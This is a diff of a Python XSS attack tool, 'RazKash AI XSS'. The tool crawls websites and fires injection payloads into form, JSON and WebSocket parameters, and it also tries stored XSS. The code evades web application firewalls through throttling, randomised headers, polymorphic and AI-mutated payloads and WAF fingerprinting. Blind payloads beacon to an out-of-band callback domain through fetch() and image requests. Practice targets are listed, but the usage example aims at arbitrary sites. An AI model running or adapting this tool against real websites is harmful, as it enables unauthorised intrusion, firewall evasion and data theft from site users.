+    for i, part in enumerate(parts):
+        is_last = (i == len(parts)-1)
+        if part.startswith('[') and part.endswith(']'):
+            idx = int(part[1:-1])
+            if is_last:
+                cur[idx] = val
+            else:
+                if isinstance(cur[idx], (dict, list)):
+                    cur = cur[idx]
+                else:
+                    cur[idx] = {}
+                    cur = cur[idx]
         else:
-            probe = {p: marker for p in t["params"]}
-            resp = (SESSION.get if method=="GET" else SESSION.post)(
-                url,
-                params=probe if method=="GET" else None,
-                data=probe if method=="POST" else None,
-                headers=random_headers(),
-                timeout=HTTP_TIMEOUT, verify=False
-            )
-        if resp.status_code!=200 or not reflected(marker, resp.text):
-            return
-    except Exception as e:
-        dbg(f"[probe] {e}")
+            if is_last:
+                cur[part] = val
+            else:
+                if part not in cur or not isinstance(cur[part], (dict, list)):
+                    cur[part] = {}
+                cur = cur[part]
+
+def fuzz_http(t: Dict[str,Any]) -> None:
+    # Skip truly static resources by extension
+    ext = Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
+    if ext in static_exts:
         return
 
-    for sk in random.sample(PAY, k=min(32, len(PAY))):
-        core = ai_mutate(sk)
-        variants = {core, polymorph(core), legit_wrap(core)}
-        for filt in FILTER:
-            variants.add(filt.replace("PAYLOAD", core))
-        if DNSLOG_DOMAIN:
-            variants.add(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('{urllib.parse.quote(core)}'))>")
-        for pay in variants:
-            try:
-                if is_json and tpl:
-                    body = json.loads(json.dumps(tpl))
-                    for p in t["params"]:
-                        set_deep(body, p, pay)
-                    r2 = SESSION.post(url, headers={"Content-Type":"application/json"},
-                                     data=json.dumps(body), timeout=HTTP_TIMEOUT, verify=False)
-                else:
-                    dat = {p: pay for p in t["params"]}
-                    r2 = (SESSION.get if method=="GET" else SESSION.post)(
-                        url,
-                        params=dat if method=="GET" else None,
-                        data=dat if method=="POST" else None,
-                        headers=random_headers(),
-                        timeout=HTTP_TIMEOUT, verify=False
-                    )
-                txt = r2.text.lower()
-                if r2.status_code in {403,429,503} or any(w in txt for w in ("captcha","access denied","blocked")):
-                    dbg(f"[waf block] {url}")
-                    jitter(10, 30)
-                    return
-                if reflected(pay, r2.text) or verify(url, method, dat if not is_json else body, is_json):
-                    log_hit(url, method, pay, t["params"])
-                    return
-            except Exception as e:
-                dbg(f"[fuzz] {e}")
-            jitter(0.6, 2.0)
+    # Throttle to avoid WAF suspicion
+    rate_limit()
+    session_splice()
+
+    # Probe first
+    try:
+        probe = {p: "" for p in t["params"]}
+        r0 = (SESSION.get if t["method"]=="GET" else SESSION.post)(
+            t["url"],
+            params=probe if t["method"]=="GET" else None,
+            data=probe  if t["method"]=="POST" else None,
+            headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False
+        )
+        if r0.status_code != 200:
+            return
+        if "image" in (r0.headers.get("content-type","").lower()):
+            return
+    except:
+        return
+
+    # Choose payload set
+    if args.blind and DNSLOG_DOMAIN:
+        # single blind vector
+        templates = [
+            f"<script>new Image().src='http://{DNSLOG_DOMAIN}/?p='+encodeURIComponent('{randstr()}')</script>"
+        ]
+    else:
+        templates = PAYLOADS
+
+    for tpl in templates:
+        payload = tpl
+        if "MASK" in payload:
+            payload = ai_mutate(payload)
+        if args.polymorph:
+            payload = polymorph(payload)
+
+        try:
+            if t.get("json") and "template" in t:
+                body = json.loads(json.dumps(t["template"]))
+                for param in t["params"]:
+                    set_deep(body, param, payload)
+                resp = SESSION.post(
+                    t["url"],
+                    json=body,
+                    headers={"Content-Type":"application/json"},
+                    timeout=HTTP_TIMEOUT,
+                    verify=False
+                )
+                sent_data = body
+            else:
+                sent_data = {p: payload for p in t["params"]}
+                resp = (SESSION.get if t["method"]=="GET" else SESSION.post)(
+                    t["url"],
+                    params=sent_data if t["method"]=="GET" else None,
+                    data=sent_data  if t["method"]=="POST" else None,
+                    headers=random_headers(),
+                    timeout=HTTP_TIMEOUT,
+                    verify=False
+                )
+
+            # Basic WAF block check
+            if resp.status_code in (403, 429, 503) or any(x in resp.text for x in ("captcha","denied","blocked")):
+                continue
+            # Skip SQL error pages
+            if SQL_ERROR_RE.search(resp.text):
+                continue
+
+            # Blind
+            if args.blind:
+                log_hit(t["url"], "BLIND", payload, t["params"])
+                return
+
+            # Reflected or "all" -> verify in a browser
+            if verify(t["url"], t["method"], sent_data, t.get("json", False)):
+                log_hit(t["url"], t["method"], payload, t["params"])
+                return
+
+        except Exception as ex:
+            dbg(f"[fuzz_http] {ex}")
+        jitter()
 
 def fuzz_ws(t: Dict[str,Any]) -> None:
+    """Attempt a WS-based injection if websockets are in use."""
     if not websocket:
         return
-    url    = t["url"]
+    if not t["url"].startswith(("ws://","wss://")):
+        return
+
+    url = t["url"]
     params = t.get("params", [])
-    tpl    = t.get("template") or {}
+    tpl = t.get("template") or {}
     marker = randstr()
-    body = json.loads(json.dumps(tpl)) if tpl else {}
+
+    try:
+        body = json.loads(json.dumps(tpl))
+    except:
+        body = {}
+
     if body:
         set_deep(body, random.choice(params), f"<img src onerror=alert('{marker}')>")
     else:
-        body[random.choice(params)] = f"<svg/onload=alert('{marker}')>"
+        if params:
+            body[random.choice(params)] = f"<svg onload=alert('{marker}')></svg>"
+        else:
+            body["payload"] = f"<svg onload=alert('{marker}')></svg>"
+
     payload = json.dumps(body)
     hit = False
-    def on_msg(ws, msg):
+
+    def on_msg(wsapp, msg):
         nonlocal hit
         if marker in msg:
             hit = True
+
     try:
-        wsapp = websocket.WebSocketApp(url, on_message=on_msg)
-        thr = threading.Thread(target=wsapp.run_forever, kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
+        wsapp = websocket.WebSocketApp(url, on_message=on_msg, header=random_headers())
+        thr = threading.Thread(target=wsapp.run_forever, kwargs={"sslopt":{"cert_reqs": ssl.CERT_NONE}})
         thr.daemon = True
         thr.start()
         time.sleep(1)
@@ -919,59 +871,110 @@ def fuzz_ws(t: Dict[str,Any]) -> None:
         time.sleep(3)
         wsapp.close()
         if hit:
-            log_hit(url, "WS", payload)
-    except Exception as e:
-        dbg(f"[ws fuzz] {e}")
+            log_hit(url, "WS", payload, params)
+    except Exception as ex:
+        dbg(f"[fuzz_ws] {ex}")
 
-# ─── MAIN DRIVER ────────────────────────────────────────────────────────────
-AUTOTEST=[
+# ─────────────────────────────────────────────────────────────────────────────
+#                          WAF DETECTION
+# ─────────────────────────────────────────────────────────────────────────────
+
+def detect_waf(url: str) -> str:
+    sigs = {
+        "cloudflare": ["__cf_bm","cf-ray","Cloudflare Ray ID"],
+        "akamai":     ["AkamaiGHost","akamai"],
+        "sucuri":     ["sucuri_cloudproxy_uuid","Access Denied - Sucuri"],
+        "imperva":    ["visid_incap_","incapsula"],
+    }
+    try:
+        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
+        t = r.text.lower()
+        for n, pats in sigs.items():
+            if any(p.lower() in t for p in pats):
+                return n
+    except:
+        pass
+    return "unknown"
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                              MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+
+AUTOTEST = [
     "http://xss-game.appspot.com/",
     "http://xss-game.appspot.com/level1",
     "https://juice-shop.herokuapp.com/"
 ]
 
-def main() -> None:
-    roots = []
+def main():
+    # Determine mode
+    mode = "all"
+    if args.reflected:
+        mode = "reflected"
+    elif args.stored:
+        mode = "stored"
+    elif args.blind:
+        mode = "blind"
+
+    # Determine target(s)
     if args.autotest:
         roots = [smart_url(u) for u in AUTOTEST]
     elif args.url:
-        roots = [smart_url(args.url.rstrip("/"))]
+        roots = [smart_url(args.url)]
     else:
         ap.print_help()
         sys.exit(1)
 
     logging.info(f"\n┌─ RazKash AI XSS v{VER}")
+
+    # Optional WAF detection
     if args.detect_waf:
         for r in roots:
-            waf = detect_waf(r)
-            logging.info(f"│   WAF detected on {r}: {waf}")
+            waf_name = detect_waf(r)
+            logging.info(f"│   WAF on {r}: {waf_name}")
+
     for root in roots:
-        logging.info(f"├─▶ {root}")
+        logging.info(f"├─▶ Crawling: {root}")
+
+        # Crawl
         static_targets  = crawl_static(root, args.max_pages, depth=1)
         dynamic_targets = crawl_dynamic(root)
-        # stored XSS simulation
-        for t in list(static_targets):
-            if t["method"] in ("POST","PUT") and not t.get("json"):
-                m = randstr()
-                SESSION.post(t["url"], data={p:m for p in t["params"]},
-                             headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
-                if verify(t["url"], "GET", {p:m for p in t["params"]}, False):
-                    log_hit(t["url"], "STORED", m)
-        targets = static_targets + dynamic_targets
-        http_targets = [t for t in targets if t["method"] != "WS"]
-        ws_targets   = [t for t in targets if t["method"] == "WS"]
-        logging.info(f"│   HTTP targets: {len(http_targets)}   WS targets: {len(ws_targets)}")
-        with ThreadPoolExecutor(max_workers=args.threads) as pool:
-            pool.map(fuzz_http, http_targets)
-            pool.map(fuzz_ws,   ws_targets)
-        logging.info("│   ✓ fuzzing complete\n")
-    logging.info(f"└─ Findings saved to {LOGFILE.resolve()}\n")
+
+        # If GraphQL endpoint
+        if "graphql" in root.lower():
+            fuzz_graphql(root)
+
+        # Combine
+        all_targets = static_targets + dynamic_targets
+
+        # Stored XSS attempt
+        if mode == "stored":
+            for t in static_targets:
+                if t["method"] in ("POST","PUT") and not t.get("json", False):
+                    for pay in stored_payloads:
+                        SESSION.post(
+                            t["url"],
+                            data={p: pay for p in t["params"]},
+                            headers=random_headers(),
+                            timeout=HTTP_TIMEOUT,
+                            verify=False
+                        )
+                        # Then check if it's reflected when the page is loaded
+                        if verify(t["url"], "GET", {}, False):
+                            # Or pass data if you want to re-send parameters
+                            log_hit(t["url"], "STORED", pay, t["params"])
+
+
+        # Blind / Reflected / All
+        elif mode in ("reflected","blind","all"):
+            http_targets = [x for x in all_targets if not x["url"].startswith(("ws://","wss://"))]
+            ws_targets   = [x for x in all_targets if x["url"].startswith(("ws://","wss://"))]
+
+            with ThreadPoolExecutor(max_workers=args.threads) as pool:
+                pool.map(fuzz_http, http_targets)
+                pool.map(fuzz_ws,   ws_targets)
+
+    logging.info(f"└─ Findings saved → {LOGFILE.resolve()}\n")
 
 if __name__ == "__main__":
     main()
-
-# ─── CLI USAGE HELP ─────────────────────────────────────────────────────────
-"""
-Examples:
-  python razkash.py -u https://target.site --crawl-iframes --simulate-spa --detect-waf --polymorph --threads 16
-"""
